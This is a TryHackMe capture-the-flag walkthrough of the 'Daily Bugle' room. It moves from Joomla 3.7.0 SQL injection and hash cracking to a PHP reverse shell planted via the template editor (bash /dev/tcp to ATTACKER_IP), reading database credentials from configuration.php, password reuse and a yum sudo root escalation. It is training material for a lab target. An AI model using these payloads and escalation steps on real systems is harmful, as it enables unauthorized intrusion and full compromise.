Daily Bugle

TryHackMe CTF - Compromise a Joomla CMS account via SQLi, crack hashes, and escalate privileges by taking advantage of yum. Also: Spiderman robbed the bank.

Port Enumeration

There are many layers to unpack here. Let's enumerate and find our best courses of approach.

One of my preferred scanning techniques is to run two Nmap scans. One gives me a faster overview of the open ports.

nmap -sC -sV -Pn --script=http-enum 10.144.132.32

Taking note of the MariaDB version in case that's our intended exploit path.

Open Ports + Services

  • Port 22: ssh + openSSH 7.4
  • Port 80: http
  • Port 3306: mysql + MariaDB 10.3.23 or earlier

The other Nmap focuses on detailing potentially exploitable vulnerabilities.

nmap -sS -Pn -sC -sV --script=vuln -T4 -A 10.145.146.247 -oN daily_bugle_nmap_result.txt

The target IP changed across my runs. Use your current room IP if you're following along.

The output is massive. Reach out to me if this scan is giving you trouble, and I'm happy to help you parse through it.

Here's what caught my eye and inadvertently grabbed our first flag:

The http-csrf script listed several paths and forms as possible CSRF findings, including the login form and its /index.php action:

The bank robber is Spiderman. /index.php/2-uncategorised/1-spider-man-robs-bank appeared in the vulnerability scan's http-csrf results.

Identifying the Joomla Version

Armed with this surface recon, let's dig deeper.

nmap -sCV -p22,80,3306 -T4 10.144.132.32

Nmap kept pushing back, so I tried a different approach.

whatweb http://10.146.132.82

Bingo. This is beautiful.

This expands our recon findings list.

Updated “what we know” list:

  • Port 22: SSH + OpenSSH 7.4 (protocol 2.0)
  • Port 80: HTTP + Apache/2.4.6 (CentOS) PHP/5.6.40
  • Port 3306: MySQL + MariaDB 10.3.23 or earlier - apparently also “unauthorized”. We’ll see about that (*wink*).
  • JQuery + Joomla
  • Nmap listed a login form with an /index.php action among its possible CSRF findings.

As far as potentially exploitable attack vectors and directories, here’s more of what we know:

  • /index.php/2-uncategorised/1-spider-man-robs-bank appeared in the vulnerability scan.
  • The http-csrf script flagged possible CSRF on /index.php; exploitability is unconfirmed.
  • The MariaDB version is worth noting, but we have not established a way in through it.
  • PHP 5.6.40 is a vulnerability goldmine.
  • Joomla CMS is ready for action.
joomscan -u http://10.146.132.82

I believe we’ve found our final attack path.

  • Joomla 3.7.0 exploitable via SQLi CVE-2017-8917
  • Admin panel lives at /administrator/

We’ve answered who the bank robber is and which Joomla version we’re targeting. Using what we know, here’s the rest of our attack path:

  • Use exploit-db against CVE-2017-8917.
  • Crack Jonah’s password using sqlmap/python script.
  • After we’re in, grab the user and root flags.

Exploit Research

searchsploit joomla 3.7.0

SearchSploit gave us one promising exploit for this Joomla version. I opened its details:

searchsploit -x php/webapps/42033.txt

It uses sqlmap, but the challenge points us toward a Python script.

searchsploit -m php/webapps/42033.txt

I checked whether SearchSploit had a Python script for the same vulnerability.

searchsploit joomla 3.7 | grep -i py

Not one here.

A little research on Joomla/Python exploits reveals a common community script.

curl -s https://raw.githubusercontent.com/XiphosResearch/exploits/master/Joomblah/joomblah.py -o joomblah.py

SQLi Credential Dump via joomblah.py

Launch time:

python3 joomblah.py http://10.146.132.82

Results are in, but with a Python 2 vs. Python 3 compatibility bug...

Here's how to fix it and rerun:

sed -i 's/result += value/result += value.decode("utf-8")/' joomblah.py
python3 joomblah.py http://10.146.132.82

From now until root, call me Jonah.

Sorry, Jonah. You just got pwned.

Admin Panel Access

Let's log in to /administrator/.

Hello, Joomla login page. Don’t mind me. I’m only here for a moment, then I’ll be out of your hair.

We are in. Thanks, Jonah and John.

This isn’t a separate Joomla vulnerability. We’re going to abuse the admin template editor, which lets us edit PHP files the web server will execute. I think you can see where that’s headed.

Head to Templates in the left panel of the dashboard:

Direct URL: http://TARGET_IP/administrator/index.php?option=com_templates

Click Templates again in the left panel. On the next page, we'll open Prostar, the active default for all pages:

Direct URL: http://TARGET_IP/administrator/index.php?option=com_templates&view=template&id=506&file=aG9tZQ==

In the Prostar template editor, open index.php from the file list. The web server executes this PHP file, so it gives us a place to plant the reverse shell.

Reverse Shell via Template Editor

Before editing index.php, start a Netcat listener in a new terminal:

nc -lvnp 4444

Add the PHP payload at the top of index.php, replacing ATTACKER_IP with your IP:

<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"); ?>

This feels oddly reminiscent of editing my MySpace source code. But I digress...

Click Save in the upper-left corner. If the shell doesn’t connect, visit the target site to trigger execution of index.php.

We caught the shell.

whoami
pwd

We are Apache. Later days, Jonah.

I searched for user.txt before moving on:

find / -name "user.txt" 2>/dev/null

Database Credentials from configuration.php

Next, I checked Joomla’s configuration.php for database credentials:

cat /var/www/html/configuration.php

The file contained:

  • DB user: root
  • DB password: nv5uz9r3ZEDzVjNu
  • DB name: joomla

Lateral Movement: su jjameson

Let's see if Joomla's database password opens jjameson, too:

su jjameson

The shell wasn’t interactive, so su refused to run. I upgraded it with a PTY:

python -c 'import pty; pty.spawn("/bin/bash")'

The password worked. We are now mid-level jameson.

Let's grab the user flag:

cat ~/user.txt

Privilege Escalation via yum

Let's see exactly how much power jjameson wields:

sudo -l

yum with no password is, indeed, delicious. Let's root this.

Thanks to our friends at GTFOBins, along with some echo modifications for this non-interactive shell, exploiting the yum binary should be straightforward.

Run these commands one by one:

TF=$(mktemp -d)
echo -e "[main]\nplugins=1\npluginpath=$TF\npluginconfpath=$TF" > $TF/x
echo -e "[main]\nenabled=1" > $TF/y.conf
echo -e "import os\nimport yum\nfrom yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE\nrequires_api_version='2.1'\ndef init_hook(conduit):\n  os.execl('/bin/sh','/bin/sh')" > $TF/y.py
sudo yum -c $TF/x --enableplugin=y

WOOOO!

Confirmed WOOOO!!!
